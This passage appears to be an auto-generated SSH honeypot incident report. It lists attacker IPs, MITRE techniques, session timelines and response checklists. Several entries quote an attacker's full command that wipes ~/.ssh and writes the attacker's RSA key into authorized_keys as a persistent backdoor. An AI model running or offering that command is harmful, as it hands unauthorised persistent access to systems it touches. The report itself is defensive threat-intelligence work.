- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90c0adc6a4a0

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-03-17 05:00 |
| **Last Seen** | 2026-03-17 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:00:10` | `cowrie.session.connect` |
| `2026-03-17 05:00:10` | `cowrie.client.version` |
| `2026-03-17 05:00:10` | `cowrie.client.kex` |
| `2026-03-17 05:00:10` | `cowrie.login.success` |
| `2026-03-17 05:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03788eb18817

| Field | Detail |
|---|---|
| **Source IP** | `103.192.39[.]37` |
| **First Seen** | 2026-03-17 05:15 |
| **Last Seen** | 2026-03-17 05:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:15:57` | `cowrie.session.connect` |
| `2026-03-17 05:15:57` | `cowrie.client.version` |
| `2026-03-17 05:15:57` | `cowrie.client.kex` |
| `2026-03-17 05:15:58` | `cowrie.login.success` |
| `2026-03-17 05:15:58` | `cowrie.session.params` |
| `2026-03-17 05:15:58` | `cowrie.command.input` |
| `2026-03-17 05:15:58` | `cowrie.command.failed` |
| `2026-03-17 05:15:59` | `cowrie.log.closed` |
| `2026-03-17 05:15:59` | `cowrie.session.params` |
| `2026-03-17 05:15:59` | `cowrie.command.input` |
| `2026-03-17 05:15:59` | `cowrie.session.file_download` |
| `2026-03-17 05:15:59` | `cowrie.log.closed` |
| `2026-03-17 05:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.192.39[.]37` to AbuseIPDB if not already reported
- [ ] Block `103.192.39[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593785398c81

| Field | Detail |
|---|---|
| **Source IP** | `103.192.39[.]42` |
| **First Seen** | 2026-03-17 05:16 |
| **Last Seen** | 2026-03-17 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:16:02` | `cowrie.session.connect` |
| `2026-03-17 05:16:02` | `cowrie.client.version` |
| `2026-03-17 05:16:02` | `cowrie.client.kex` |
| `2026-03-17 05:16:03` | `cowrie.login.success` |
| `2026-03-17 05:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.192.39[.]42` to AbuseIPDB if not already reported
- [ ] Block `103.192.39[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a78749a777

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:53 |
| **Last Seen** | 2026-03-17 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:53:17` | `cowrie.session.connect` |
| `2026-03-17 05:53:17` | `cowrie.client.version` |
| `2026-03-17 05:53:18` | `cowrie.client.kex` |
| `2026-03-17 05:53:18` | `cowrie.login.success` |
| `2026-03-17 05:53:19` | `cowrie.session.params` |
| `2026-03-17 05:53:19` | `cowrie.command.input` |
| `2026-03-17 05:53:19` | `cowrie.log.closed` |
| `2026-03-17 05:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18834ca91e84

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:53 |
| **Last Seen** | 2026-03-17 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:53:30` | `cowrie.session.connect` |
| `2026-03-17 05:53:30` | `cowrie.client.version` |
| `2026-03-17 05:53:31` | `cowrie.client.kex` |
| `2026-03-17 05:53:31` | `cowrie.login.success` |
| `2026-03-17 05:53:32` | `cowrie.session.params` |
| `2026-03-17 05:53:32` | `cowrie.command.input` |
| `2026-03-17 05:53:32` | `cowrie.log.closed` |
| `2026-03-17 05:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7042c72e2486

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:54 |
| **Last Seen** | 2026-03-17 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:54:35` | `cowrie.session.connect` |
| `2026-03-17 05:54:35` | `cowrie.client.version` |
| `2026-03-17 05:54:35` | `cowrie.client.kex` |
| `2026-03-17 05:54:36` | `cowrie.login.success` |
| `2026-03-17 05:54:36` | `cowrie.session.params` |
| `2026-03-17 05:54:36` | `cowrie.command.input` |
| `2026-03-17 05:54:36` | `cowrie.log.closed` |
| `2026-03-17 05:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801567cb5756

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:55 |
| **Last Seen** | 2026-03-17 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:55:00` | `cowrie.session.connect` |
| `2026-03-17 05:55:00` | `cowrie.client.version` |
| `2026-03-17 05:55:01` | `cowrie.client.kex` |
| `2026-03-17 05:55:02` | `cowrie.login.success` |
| `2026-03-17 05:55:02` | `cowrie.session.params` |
| `2026-03-17 05:55:02` | `cowrie.command.input` |
| `2026-03-17 05:55:02` | `cowrie.log.closed` |
| `2026-03-17 05:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a5cf60c75f6

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:55 |
| **Last Seen** | 2026-03-17 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:55:33` | `cowrie.session.connect` |
| `2026-03-17 05:55:33` | `cowrie.client.version` |
| `2026-03-17 05:55:33` | `cowrie.client.kex` |
| `2026-03-17 05:55:33` | `cowrie.login.success` |
| `2026-03-17 05:55:34` | `cowrie.session.params` |
| `2026-03-17 05:55:34` | `cowrie.command.input` |
| `2026-03-17 05:55:34` | `cowrie.log.closed` |
| `2026-03-17 05:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b2d518d6f3

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:56 |
| **Last Seen** | 2026-03-17 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:56:04` | `cowrie.session.connect` |
| `2026-03-17 05:56:04` | `cowrie.client.version` |
| `2026-03-17 05:56:05` | `cowrie.client.kex` |
| `2026-03-17 05:56:05` | `cowrie.login.success` |
| `2026-03-17 05:56:06` | `cowrie.session.params` |
| `2026-03-17 05:56:06` | `cowrie.command.input` |
| `2026-03-17 05:56:06` | `cowrie.log.closed` |
| `2026-03-17 05:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388ac4bed4b3

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:56 |
| **Last Seen** | 2026-03-17 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:56:43` | `cowrie.session.connect` |
| `2026-03-17 05:56:43` | `cowrie.client.version` |
| `2026-03-17 05:56:43` | `cowrie.client.kex` |
| `2026-03-17 05:56:44` | `cowrie.login.success` |
| `2026-03-17 05:56:44` | `cowrie.session.params` |
| `2026-03-17 05:56:44` | `cowrie.command.input` |
| `2026-03-17 05:56:44` | `cowrie.log.closed` |
| `2026-03-17 05:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7983ef5ec9

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:56 |
| **Last Seen** | 2026-03-17 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:56:55` | `cowrie.session.connect` |
| `2026-03-17 05:56:55` | `cowrie.client.version` |
| `2026-03-17 05:56:55` | `cowrie.client.kex` |
| `2026-03-17 05:56:56` | `cowrie.login.success` |
| `2026-03-17 05:56:57` | `cowrie.session.params` |
| `2026-03-17 05:56:57` | `cowrie.command.input` |
| `2026-03-17 05:56:57` | `cowrie.log.closed` |
| `2026-03-17 05:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6744df2ea0

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:57 |
| **Last Seen** | 2026-03-17 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:57:14` | `cowrie.session.connect` |
| `2026-03-17 05:57:14` | `cowrie.client.version` |
| `2026-03-17 05:57:15` | `cowrie.client.kex` |
| `2026-03-17 05:57:15` | `cowrie.login.success` |
| `2026-03-17 05:57:16` | `cowrie.session.params` |
| `2026-03-17 05:57:16` | `cowrie.command.input` |
| `2026-03-17 05:57:16` | `cowrie.log.closed` |
| `2026-03-17 05:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ed80be95b2

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:57 |
| **Last Seen** | 2026-03-17 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:57:21` | `cowrie.session.connect` |
| `2026-03-17 05:57:21` | `cowrie.client.version` |
| `2026-03-17 05:57:21` | `cowrie.client.kex` |
| `2026-03-17 05:57:22` | `cowrie.login.success` |
| `2026-03-17 05:57:22` | `cowrie.session.params` |
| `2026-03-17 05:57:22` | `cowrie.command.input` |
| `2026-03-17 05:57:22` | `cowrie.log.closed` |
| `2026-03-17 05:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8cbfd2a9c0

| Field | Detail |
|---|---|
| **Source IP** | `134.122.18[.]242` |
| **First Seen** | 2026-03-17 05:57 |
| **Last Seen** | 2026-03-17 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 05:57:40` | `cowrie.session.connect` |
| `2026-03-17 05:57:40` | `cowrie.client.version` |
| `2026-03-17 05:57:40` | `cowrie.client.kex` |
| `2026-03-17 05:57:41` | `cowrie.login.success` |
| `2026-03-17 05:57:41` | `cowrie.session.params` |
| `2026-03-17 05:57:41` | `cowrie.command.input` |
| `2026-03-17 05:57:41` | `cowrie.log.closed` |
| `2026-03-17 05:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.122.18[.]242` to AbuseIPDB if not already reported
- [ ] Block `134.122.18[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2ff4097d6a

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-03-17 06:24 |
| **Last Seen** | 2026-03-17 06:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 06:24:39` | `cowrie.session.connect` |
| `2026-03-17 06:24:39` | `cowrie.client.version` |
| `2026-03-17 06:24:39` | `cowrie.client.kex` |
| `2026-03-17 06:24:40` | `cowrie.login.success` |
| `2026-03-17 06:24:40` | `cowrie.session.params` |
| `2026-03-17 06:24:40` | `cowrie.command.input` |
| `2026-03-17 06:24:40` | `cowrie.command.failed` |
| `2026-03-17 06:24:40` | `cowrie.log.closed` |
| `2026-03-17 06:24:41` | `cowrie.session.params` |
| `2026-03-17 06:24:41` | `cowrie.command.input` |
| `2026-03-17 06:24:41` | `cowrie.session.file_download` |
| `2026-03-17 06:24:41` | `cowrie.log.closed` |
| `2026-03-17 06:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21be30880f97

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-03-17 06:24 |
| **Last Seen** | 2026-03-17 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 06:24:44` | `cowrie.session.connect` |
| `2026-03-17 06:24:44` | `cowrie.client.version` |
| `2026-03-17 06:24:44` | `cowrie.client.kex` |
| `2026-03-17 06:24:45` | `cowrie.login.success` |
| `2026-03-17 06:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1206c95b23b3

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 07:10 |
| **Last Seen** | 2026-03-17 07:11 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:10:39` | `cowrie.session.connect` |
| `2026-03-17 07:10:43` | `cowrie.client.version` |
| `2026-03-17 07:10:43` | `cowrie.client.kex` |
| `2026-03-17 07:11:07` | `cowrie.login.success` |
| `2026-03-17 07:11:21` | `cowrie.session.params` |
| `2026-03-17 07:11:21` | `cowrie.command.input` |
| `2026-03-17 07:11:29` | `cowrie.log.closed` |
| `2026-03-17 07:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1726a13d1cf6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-17 07:27 |
| **Last Seen** | 2026-03-17 07:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:27:37` | `cowrie.session.connect` |
| `2026-03-17 07:27:37` | `cowrie.client.version` |
| `2026-03-17 07:27:37` | `cowrie.client.kex` |
| `2026-03-17 07:27:37` | `cowrie.login.success` |
| `2026-03-17 07:27:37` | `cowrie.session.params` |
| `2026-03-17 07:27:37` | `cowrie.command.input` |
| `2026-03-17 07:27:37` | `cowrie.command.failed` |
| `2026-03-17 07:27:38` | `cowrie.log.closed` |
| `2026-03-17 07:27:38` | `cowrie.session.params` |
| `2026-03-17 07:27:38` | `cowrie.command.input` |
| `2026-03-17 07:27:38` | `cowrie.session.file_download` |
| `2026-03-17 07:27:38` | `cowrie.log.closed` |
| `2026-03-17 07:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4836b5931d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-17 07:27 |
| **Last Seen** | 2026-03-17 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:27:40` | `cowrie.session.connect` |
| `2026-03-17 07:27:40` | `cowrie.client.version` |
| `2026-03-17 07:27:40` | `cowrie.client.kex` |
| `2026-03-17 07:27:40` | `cowrie.login.success` |
| `2026-03-17 07:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb96b7b3e4e7

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-17 07:27 |
| **Last Seen** | 2026-03-17 07:28 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:27:51` | `cowrie.session.connect` |
| `2026-03-17 07:27:54` | `cowrie.client.version` |
| `2026-03-17 07:27:54` | `cowrie.client.kex` |
| `2026-03-17 07:28:14` | `cowrie.login.success` |
| `2026-03-17 07:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b62d9414dbc

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-17 07:35 |
| **Last Seen** | 2026-03-17 07:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:35:22` | `cowrie.session.connect` |
| `2026-03-17 07:35:22` | `cowrie.client.version` |
| `2026-03-17 07:35:22` | `cowrie.client.kex` |
| `2026-03-17 07:35:23` | `cowrie.login.success` |
| `2026-03-17 07:35:24` | `cowrie.session.params` |
| `2026-03-17 07:35:24` | `cowrie.command.input` |
| `2026-03-17 07:35:24` | `cowrie.command.failed` |
| `2026-03-17 07:35:24` | `cowrie.log.closed` |
| `2026-03-17 07:35:24` | `cowrie.session.params` |
| `2026-03-17 07:35:24` | `cowrie.command.input` |
| `2026-03-17 07:35:25` | `cowrie.session.file_download` |
| `2026-03-17 07:35:25` | `cowrie.log.closed` |
| `2026-03-17 07:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def7a38ea5a9

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-17 07:35 |
| **Last Seen** | 2026-03-17 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-17 07:35:28` | `cowrie.session.connect` |
| `2026-03-17 07:35:28` | `cowrie.client.version` |
| `2026-03-17 07:35:28` | `cowrie.client.kex` |
| `2026-03-17 07:35:29` | `cowrie.login.success` |
| `2026-03-17 07:35:29` | `cowrie.session.closed` |

